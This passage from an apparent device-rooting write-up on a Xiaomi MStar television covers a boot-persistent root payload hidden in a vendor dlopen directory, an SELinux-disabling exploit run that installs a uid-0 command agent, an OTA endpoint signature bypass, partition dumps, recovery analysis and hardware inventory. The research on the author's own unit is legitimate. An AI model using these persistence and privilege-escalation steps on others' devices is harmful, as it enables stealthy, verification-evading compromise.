       cil 2668: mediaserver may execute files labelled system_data_file   OK
  -> payload constructor forks -> execve svc in the same directory
       (svc = copy of /system/bin/service, inherits the directory label)
  -> svc call TvService 4400 s16 s s16 sh,/data/local/tmp/rootd.sh
       find TvService (cil 2673) + binder call -> system_app (plat 9335/648)   OK
  -> TvService (system_app) setprop vendor.misysdiagnose.cmd.*            OK (cil 3442)
  -> init: exec - root root -- misysdiagnose -s sh,/data/local/tmp/rootd.sh   OK (m7642.rc:389)
```

`/system/lib/libmiplayeradapter.so` is linked into `libmediaplayerservice.so` and
therefore loaded by `mediaserver` at boot. It contains four `dlopen` paths into
`/data/misc/mitv_upgraded_libs/` — a vendor mechanism for pushing library updates
without touching the system image. `/data/misc/mitv_upgraded_libs` already exists on
the device (created by init with mode 0775, label `system_data_file`), and is empty.
Files created there inherit the directory label, which is exactly what cil:2668
allows mediaserver to execute.

Everything lives in `/data`, which AVB does not verify, and nothing touches a signed
partition. In theory the device would come back as root on every boot with
`veritymode` still enforcing.

Status: `ghost/ghostboot.c` is the payload source (fork in a constructor, poll every
5 s, marker file `.rootd.ok` to stop, `.ghost_test` to only prove the constructor
runs). The v1 binary was deleted: it was built with musl `-lc` and carried a
`DT_NEEDED libc.so`, i.e. a second libc inside `mediaserver`. A v2 build must use raw
syscalls only. Nothing was ever placed on the device; the directory is still empty.

Unfreezing (three online checks, no reboot required):

1. `service call TvService 4400 s16 s s16 sh,/data/local/tmp/rootd.sh` — confirm
   `rootd.log` and `.rootd.ok`, i.e. the real init path works.
2. Drop `.ghost_test` plus the payload, `kill mediaserver`, confirm
   `.ghost_ctor_ok` appears *and* mediaserver survives.
3. Remove the flag, kill mediaserver again, and only then consider a real reboot.

Rescue ladder, in order: `.ghost_off` switch, delete
`/data/misc/mitv_upgraded_libs/{libmiffmpeg.so,svc}` plus `kill mediaserver`,
re-enable network debugging by hand, re-run the exploit for root, factory reset from
recovery (the payload disappears with `/data`), reflash the OTA from recovery. This
mechanism cannot hard-brick the unit: it writes nothing that is verified, so recovery
remains reachable at every step.

---

## 13. Partition dump

40 images: 36 named partitions (37 minus `userdata`), plus `mmcblk0boot0/1`, plus the
first and last 1 MB of `mmcblk0`. Each was `dd`ed on the device with an immediate
`sha256sum`, then re-hashed on the host: **40/40 sizes and hashes match**. Total
5.7 GB, 13.5 minutes wall clock (3.6 on device, 9.9 transferring at
9.6-10.6 MB/s over WiFi). `userdata` (23.9 GB, 80% of the disk) was skipped; it has
no value for kernel analysis and can be dumped separately if ever needed.

Two practical notes: this device's `dd` rejects `bs=1M` and needs `bs=1048576`, and
raw read throughput is 110-150 MB/s while read-while-write through FUSE drops to
25-28 MB/s.

### 13.1 There is no GPT on this disk

The first sectors of `mmcblk0` contain no MBR signature (`55AA`) and no GPT header
(`EFI PART`); the last 1 MB is entirely zero, so there is no backup table either.
The real table is a private MStar structure starting at LBA 0:

```
per entry, 512 bytes:
    magic      u32   0x5840
    zero       u32
    start_lba  u32
    size_lba   u32
    name       char[48]
table header magic: 0x1630
```

37 entries, **perfectly contiguous with zero gaps**. No hidden partition, no
unmapped room where data could be stashed. The entries end at LBA 60,711,552;
the disk has 61,071,360 sectors, leaving 175.7 MB of trailing unallocated space. The
full table, offsets, sizes and per-partition hashes are reproducible with
`ghost/gen_manifest.py`.

`/data/misc` (where the persistence payload would live) is labelled
`system_data_file`, which is what makes the dlopen plan legal for `mediaserver`.

### 13.2 vbmeta

The `vbmeta` header fields are stored **big-endian** — reading them little-endian
produces plausible-looking garbage (`ver=16777216.0`), which cost some time.
Correct values: `alg@28 = 2` (SHA256_RSA2048), `hash_size@40 = 32`,
`signature_size@56 = 512`. The descriptors cover `boot`, `recovery`, `dtbo`,
`system` and `vendor`; `system` uses hashtree + dm-verity + FEC.

`misc.img` contains 24 non-zero bytes (an empty bootloader control block) and is
**not covered by any vbmeta descriptor** — it is writable without breaking
verification. Writing `boot-fastboot` into the BCB would plausibly drop the unit
straight into fastboot. That path was not taken: the brick risk of a failed
`fastboot` transition on a device with no accessible recovery button sequence was
never assessed, so it stays a lead, not a result.

`product.img` is not ext4 (its header is all zero), and `system`/`vendor` extract
cleanly with 7-Zip (symbolic-link errors are expected and harmless).

---

## 14. Tooling

`tools/` is 15 standalone scripts. The ones worth knowing:

| Script | Purpose |
|---|---|
| `kallsyms_dump.py`, `symsig.py` | recover the symbol table from a raw arm64 image, with no ELF/BTF/relocations |
| `dumpfn.py`, `dis_so.py`, `dis_so2.py` | disassemble a function with symbol-bounded extents and resolved `bl` targets |
| `chainpath.py` | confirm who calls `rt_mutex_adjust_prio_chain` and with which `chwalk` value |
| `find_waiter.py` | locate the stack base of `rt_waiter` by finding self-referential stores |
| `stacksurvey.py`, `framesurvey.py`, `framecalc.py` | compute frame depth from a syscall entry to a stack buffer |
| `verify_sigframe.py` | verify the sigframe/VFP pointer arithmetic and the `sched_attr` size check |
| `find_zero_region.py` | find a zero-filled, unreferenced region usable as a fake `rt_mutex` |
| `xref_page.py` | find every `adrp`+`ldr/str` reference into a window of a page |
| `nearby.py` | symbols and section around an address |
| `fetch_ota.py` | pull the full OTA package (and range-extract single files) from the vendor API |

`fetch_ota.py` is worth a note: the upgrade endpoint accepts a `packagetype=full`
parameter that the `opaque` signature does not cover, so appending it to a captured
`getupgradeinfo` URL returns the full zip. It is a ~1.3 GB download; `--extract` uses
a Range request and fetches only the member you ask for.

`GhostLock-for-OnePlus` and the CVE-2019-2215 reference sources are not vendored
here; `cve2215/` keeps only the Linux 4.9 files needed to read the code paths
(`futex49.c`, `rtmutex49.c`, `rtmutex_common49.h`, `binder49.c`, `socket49.c`) plus
the original Bad Binder trigger for comparison.

---

## 15. Reproducing

```bash
export DEV=<tv-ip>:5555
export ADB=adb

# verify the write primitive without touching anything (writes into our own page)
bash ghost/run24b.sh --walk --soft --ucoff 0x108 121 19 --rounds 4000

# measure the three-way outcome distribution
bash ghost/nullscan.sh 6

# real run, retrying across processes until it lands
bash ghost/off_selinux.sh
```

`off_selinux.sh` fires `TvService` 4400 as soon as `enforce` reads 0, installing a
uid-0 agent that watches `/sdcard/Download/cmd.sh`. From that point any root command
is one `adb push` away; `ghost/dumpset.sh` and `ghost/dumpraw.sh` are what produced
the partition set.

Two wrappers make that channel bearable:

```bash
bash ghost/r.sh 'id'                     # one command as root, output and exit code back
bash ghost/r.sh -t 60 'pm list packages -3'
bash ghost/klogd_ctl.sh start            # kernel crash black box
bash ghost/klogd_ctl.sh tail 80
```

`r.sh` exists because the root domain's `PATH` is only `/vendor/bin:/vendor/xbin`: `pm`,
`settings`, `am` and `cmd` are all in `/system/bin` and answer `not found` until it is
fixed. It also waits for the trailing `R_EXIT=` marker rather than the leading nonce —
waiting on the nonce alone returns half the output of a slow command, which it did until
that was measured.

`klogd.sh` exists because `pstore` is 0: without it a locked-up kernel leaves no evidence
at all. It polls instead of using `dmesg -w` (follow mode block-buffers its stdout on this
toybox build, so later lines never leave the buffer) and appends only the delta after an
anchor line (writing a full snapshot every second would rewrite 570 KB continuously on a
TV that prints audio parameters once a second). Measured cost when idle: no measurable CPU,
about 1.8 KB/s written.

Every script takes `DEV` and `ADB` from the environment. On MSYS/Git Bash, adb
remotes must be written as `//sdcard/...` with `MSYS2_ARG_CONV_EXCL='*'
MSYS_NO_PATHCONV=1`, or the shell rewrites the path.

---

## 16. Open questions

1. **The NULL branch.** Two thirds of processes clear `pi_blocked_on`. Finding the
   vendor's futex patch would probably turn a 1-in-3 exploit into a reliable one.
   Requires either the vendor kernel sources or a working way to observe kernel
   memory on the device.
2. **A non-zero write gadget.** The current primitive's `rb_right` must be 0 because
   case 1 dereferences a non-NULL child. Another `rb_erase` path, or a different
   chain node, might avoid that.
3. **`/cache/recovery/command`.** The string exists in the recovery binary at `0x175c60`
   but the xref scan finds no reference to it. Whether recovery reads it at all is
   untested; the probe is to write `--locale=en-US`, reboot, and see whether `last_locale`
   changes. (The earlier idea of writing an AOSP BCB into `misc` is dead — see section 17.4.)
4. **Policy audit.** `system.img` and `vendor.img` are dumped; a full review of the
   `.cil` files, and a diff of the OTA package against the dump, would probably
   surface more of the vendor's engineering interfaces.
5. **Which rule of the binary policy allows `shell` to reach `system_app`.** Narrowed, not
   solved. Section 11.1 now establishes that the device loads only
   `/vendor/etc/selinux/precompiled_sepolicy` (29,175 rules) and never reads the three
   `.cil` files, so the shipped text cannot answer the question at all. What remains is
   extracting the grant from the binary:
   `sesearch --allow -s shell -t system_app -c binder precompiled_sepolicy`. That needs
   setools or secilc, which the host does not have — a Linux environment has to be set up
   first.
6. **A self-built kernel module.** Not attempted, recorded because the door looks unlocked:
   `modules_disabled=0`, 38 vendor `.ko` files load, `insmod` exists, and the kernel is
   **aarch64** while userspace is armv8l with
   `vermagic=4.9.118+ SMP preempt mod_unload modversions aarch64`. The `module_layout` CRC
   could be lifted from a vendor module's `__versions` section, and with the kernel fixed
   at a known address (no KASLR) a module could import nothing and call by absolute
   address. The downside is severe: one wrong `struct module` field corrupts the kernel on
   load, and `pstore` is 0, so there would be no record of what went wrong.

---

## 17. The recovery image: what it can and cannot do

The question: is there any way into recovery that does not require wired adb?
No. What follows is the set of measurements that close each door in turn.

### 17.1 What one recovery boot actually left behind

The device was booted into recovery once, to look for an ADB entry in the menu. The
only trace it left:

```
/cache/recovery/last_locale   2026-11-07 20:57   zh-CN
/cache/recovery/last_log      still 2023-08-27, not one byte rewritten
```

A normal menu session rewrites `last_log` on entry and mirrors it to `/dev/console`.
It was not rewritten, so that boot never reached a menu session. This is consistent
with only four entries being visible: the page holds four buttons, and the rest
(`mount_usb` and friends) appear only with a USB stick inserted.

### 17.2 The UI is a Xiaomi graphical menu, not AOSP's text menu

The binary names its own source file and log tag:

```
bootable/recovery/GraphicScreenRecoveryUI.cpp
GraphicScreenRecoveryUI StartMenu
```

Immediately after those strings sits a table of button image names: `reboot_normal`,
`wipe_normal`, `install_update_normal`, `mount_usb_normal`, `power_off_normal`,
`wipe_cache_normal`, `wipe_data_normal`, `format_data_normal`, `usb_connected`,
`usb_no_connection`, `usb_umount_*`, `choice_yes|no`, `back`, `back_main`,
`install_update_confirm|ok|no_file|file_corrupt|verify_fail`.

The AOSP text path is dead code. Scanning every `bl` in the text segment:

```
GetMenuItems(0xcc0c)         callers: NONE
HandleMenuKey(0xcc4c)        callers: NONE
get_menu_selection(0x14c38)  callers: NONE
```

The 12-entry ASCII menu at `0x193000` in `.data` is therefore never rendered, and any
inference of the form "item 3 of the menu is Apply update from ADB" is invalid on this
image.

Transcribed from the button PNGs (540x108, `rd/res/images/xiaomi/`). The UI is
Chinese-localized; labels are given here in English:

| image | label (translated) |
|---|---|
| `reboot_*` | Reboot |
| `wipe_*` | Wipe all data |
| `install_update_*` | Install update to system |
| `mount_usb_*` | Enable USB storage |
| `power_off_*` | Power off |
| `wipe_cache_*` | Wipe cache |
| `wipe_data_*` | Wipe user data |
| `format_data_*` | md5 identical to `wipe_normal.png` (`1a1dab96ec9d4b4a35e2e548a2cc3b33`) |
| `restore_rom_selected.png` | Restore factory system — orphan resource, no `_normal` variant, no code path |

Eight buttons, and none of them is ADB, sideload or shell. A second, two-item rescue
screen exists (`Try again` / `Factory data reset`) and also has no ADB entry.

### 17.3 Wireless adb is structurally impossible

Two independent walls.

**Wall 1 — adbd never starts.**

```
init.rc:90   service adbd /sbin/adbd --root_seclabel=u:r:su:s0 --device_banner=recovery
                 disabled                    ← not started by class_start default
init.rc:96   on property:ro.debuggable=1
                 start adbd                  ← prop.default:9 sets 0, never true
```

The only other starter is `ctl.start adbd` from the menu or `adb_install.cpp`, and that
publishes a USB gadget (`/dev/usb-ffs/adb`, `18D1:D001`), not a socket.

**Wall 2 — even if adbd ran, there is no network.**

```
init.rc:48                     ifup lo                      ← loopback only
init.recovery.m7642.rc:24      #insmod .../wlan.ko          ← commented out
rd/sbin/: adbd busybox charger e2fsdroid_static insmod mke2fs_static mksh recovery
          no dhcpcd, no wpa_supplicant, no ifconfig, no ip
```

Worth stating explicitly because it is easy to misread: the port properties *are*
present (`service.adb.tcp.port=5555`, `persist.adb.tcp.port=5555`, `ro.adb.secure=0`),
and adbd carries both strings. The gap is not configuration — it is that adbd does not
start and there is no interface to bind. Recovery never brings up `eth0` either.

So there is no remote entry into recovery at all. What is left is a UART console or the
remote-control menu.

### 17.4 `misc` is a MStar "APOLLO message", not an AOSP BCB

A 512 KB `misc` dump searched byte by byte for `boot-recovery`, `--sideload`,
`--update_package` and `--wipe_data`: all four are absent. The first 32 bytes are a
U-Boot uImage header:

```
27 05 19 56 | 94 4f 16 c5 | 63 e5 29 fa | 01 24 72 00
20 28 00 00 | 20 28 00 00 | 19 17 9e 75 | 05 02 02 00 | "Linux-4.9.118+"
```

load/entry are `0x20280000`, matching `kernel_addr` in the recovery image header. A dump
taken hours apart differs by 43 bytes, so the region is being rewritten normally, not
corrupted.

The vendor's own log calls it by name — `start to clear APOLLO message`,
`Failed to clear BCB message`, `mmc read.p 0x%08lX misc 40`. It is a private MStar
structure. A textual AOSP BCB existed on exactly one occasion, the factory OTA in 2023
(see 17.6). Writing AOSP BCB strings here would not be parsed by either the bootloader
or recovery.

The BCB keyword table in the binary is, however, four entries longer than AOSP's:

```
/udisk/xiaomi_update  update_package  retry_count  wipe_data
format_data           clean_app       wipe_cache   show_text
sideload              sideload_auto_reboot  just_exit  locale
shutdown_after        reason          security
```

Vendor additions: `format_data`, `clean_app`, `security`, `/udisk/xiaomi_update`.

### 17.5 `res/keys` is the vendor's own release key

```
len      = 64 (RSA-2048)
n0inv    on disk = 0xf0647c17   recomputed = 0xf0647c17   MATCH
modulus  = b7833409d1f228b6b3d2cde4311812b95b7f9e6a9042e7cff1bfca3d11187329
           6971aa42981482dc8767d1e9fd5d4aafeb758a3715873a93df6326d8218d76c1 ...
mod(BE) sha256 = 7c48f2cc6d1888883c485b97829ee77908e2ed60d6be37fea9363441413a2237
```

| key | sha256 prefix |
|---|---|
| this device's `res/keys` | `7c48f2cc…` |
| AOSP testkey | `d6931904…` |
| AOSP platform | `9c780592…` |

All three differ, so the recovery trusts a vendor release key and nothing else. The
shipped OTA (`package-alita-6129-user.zip`, 1.36 GB) is signed with it, which is
consistent with `ro.product.vendor.name=alita` and `/udisk/update-alita.zip`. A
self-signed `update.zip` is not an option.

### 17.6 The one normal recovery session on record

The factory OTA of 2023 is the only log on the device that shows recovery doing its job:

```
[0.013393] I:Boot command: boot-recovery
[0.013400] I:Got 3 arguments from boot message
[0.017236] locale is [zh-CN]
[0.370071] Command: "/sbin/recovery" "--update_package=@/cache/recovery/block.map" "--locale=zh-CN"
[0.450895] I:Update location: @/cache/recovery/block.map
```

and `last_install` from the same run: `target_build 6129` from `source_build 5224`,
`bytes_written_system 1405304832`, `bytes_stashed_system 1707626496`,
`bytes_written_vendor 662024192`, `bytes_stashed_vendor 753553408`,
`uncrypt_file /data/ota_package/package-9.5224-9.6129.zip`.

### 17.7 Channels that do not need TCP adb

| channel | gives a shell? | state |
|---|---|---|
| UART console | **yes** — the only one | `service console /sbin/busybox sh`, `user root`, `u:r:shell:s0`; needs the case opened |
| `/cache/recovery/command` | arguments only | string present at `0x175c60`, but the xref scan is empty — untested |
| `misc` BCB | no | occupied by the APOLLO message (17.4) |
| remote-control menu | no | wipe, install a signed package, mount `/system`, read logs |

### 17.8 fastboot exists, but USB only

`MBOOT.img` (`MUSB-02.05`, `CL565126(Feb 10 2023 - 01:15:35)`) contains
`fastboot_port`, `Listening for fastboot transfer on %s`, `enter fastboot mode`,
`MTK Fastboot..`, `fastboot_okay` / `fastboot_fail` / `unknown command`,
`--fastboot`, `boot-bootloader`, `reboot-bootloader`, `rebooting to fastbootd`, and the
same `mmc read.p 0x%08lX misc 40` used for the APOLLO message,
plus `avbab set_device_state 0 / unlock`, `avbab disable-verity`, `close_avb_cnt`.

On the system side: `ro.boot.bootloader=123456789` (a placeholder),
`ls /system/bin | grep fastboot` is empty (no fastbootd binary),
`ro.boot.verifiedbootstate=green`, `ro.boot.veritymode=enforcing`.

So the protocol runs over the USB endpoint only — no network or serial transport, and the
bootloader does not time out of fastboot on its own. The `avbab` and `unlock` commands
belong to the factory-mode flow (`/factory.prop`, `mitv.factory.*`), not to a
user-facing `fastboot oem unlock`.

---

## 18. Hardware inventory

Collected over the existing uid 0 channel with the policy made permissive. `boot_id` did
not change and uptime stayed continuous, so this is all read-only.

### 18.1 SoC

| item | value | source |
|---|---|---|
| SoC | **MStar M7642** (MediaTek MT9652 platform) | `/proc/cpuinfo` Hardware, `/proc/device-tree/model`, `compatible = arm,m7642` |
| CPU | 4x **Cortex-A53**, ARMv8-A, 32-bit userspace | `CPU part 0xd09`, `implementer 0x41`, `variant 0x1` |
| Features | aes pmull sha1 sha2 crc32 vfpv4 lpae neon | `/proc/cpuinfo` |
| Platform | `DP1C_2B:RZ2L`, `hardware_version=rz2l` | `androidboot.model_name` |
| Wireless combo | **MTK7668** (WiFi + BT) | `androidboot.module=MTK7668` |

### 18.2 RAM

```
MemTotal 2,704,376 kB (2.58 GiB visible)
```

| device-tree node | range | size |
|---|---|---|
| `memory@20200000` | 0x20200000–0x423FFFFF | 546 MiB |
| `memory@50800000` | 0x50800000–0x9E1FFFFF | 1242 MiB |
| `memory@80000000` | 0x1_80000000–0x1_BFFFFFFF | 1024 MiB (high window) |

`cmdline`: `LX_MEM=0x22200000`, `LX_MEM2=0x50800000,0x4DA00000`,
`LX_MEM3=0x180000000,0x40000000`, `DRAM_ASYM_SIZE=40000000`.

The Linux regions total 2.75 GiB; `0x0–0x201FFFFF` (514 MiB) is withheld from the kernel
for TEE, the bootloader and the secure video path. The part is a 3 GB SKU.

Not obtainable in software: the DRAM vendor and part number. M7642 exposes no SPD path,
and DRAM is brought up by a closed MRC blob inside MBOOT (`CurMRCAddr`); MBOOT's strings
contain only placeholders such as `DRAM Channel 0..3 Size` and `DDR Mode`, with no
`DDR4`/`DDR3`/`LPDDR` variant and no vendor name.

### 18.3 eMMC

| item | value |
|---|---|
| Part name | **DA4032** |
| Vendor | **SanDisk** (`manfid 0x000045`, JEDEC MID; `oemid 0x0100`) |
| Capacity | 61,071,360 sectors x 512 = **31,268,536,320 B ≈ 29.1 GiB** (32 GB class) |
| Manufacture date | **2022-02** |
| CID | `45010044413430333201c9cc16462900` |
| Serial | `0xc9cc1646`; fwrev `04140619` |
| Wear | `life_time 0x01 0x01`, `pre_eol_info 01` — healthy |

### 18.4 Panel

| item | value |
|---|---|
| Vendor | **CSOT** (`ro.boot.mi.panel_vendor=CSOT`) |
| Size | **65 inch** (`ro.boot.mi.panel_size=65`) |
| Part | **ST6451D03-7** (config `RZ2L_ST6451D03_7.ini`) |
| Native resolution | **3840x2160** (`m_wPanelWidth` / `m_wPanelHeight`) |
| Panel type | a-Si TFT-LCD, HVA, 10-bit, 120 Hz capable |
| Interface | **V-by-One 16 lane** (`m_pPanelName = UD_VB1_16LANE`, LinkType 10, LinkExtType 58, single port) |
| Drive timing | DCLK **600 MHz**, HTotal **4400**, VTotal **2260** → **4K@60.3 Hz**; HStart 110, VStart 98 |
| Backlight PWM | period `0x4119` (16665), min `0x9C3`, non-inverted (`_PWM960` low-frequency variant exists, unused here) |
| UI output | fb0 "MStar FB", `1920x1080p-51`, 32 bpp, density 320 |
| Colour / PQ | `pq_RZ2L_CSOT/`, `gammatable_RZ2L_CSOT.ini`, `HDR_RZ2L_CSOT.ini` |
| Flags | `panel_buildin=true`, `panel_type=3`, `panel_memc_attribute=1` |

One trap worth recording: `RZ2L_HV650QUB_E9D.ini` also declares
`m_pPanelName = UD_VB1_16LANE`, but it is referenced from `Customer_15.ini` and paired
with `pq_RZ2L_BOE` / `gammatable_RZ2L_BOE` — it is the **BOE** sibling SKU. This unit's
`CFG_SYS_INI=sys_14.ini` points at `Customer_14.ini`, which selects the CSOT branch.
Identifying the panel by ini filename alone gives the wrong answer.

### 18.5 Identifiers

`model_name` is `DP1C_2B:RZ2L`; the serial number, assembly number and WiFi MAC are
device-unique and deliberately omitted here.

### 18.6 What cannot be read

DRAM vendor and part number (no SPD, closed MRC); the T-CON IC part on the panel; and the
eMMC NAND type (`ext_csd` does not carry it).
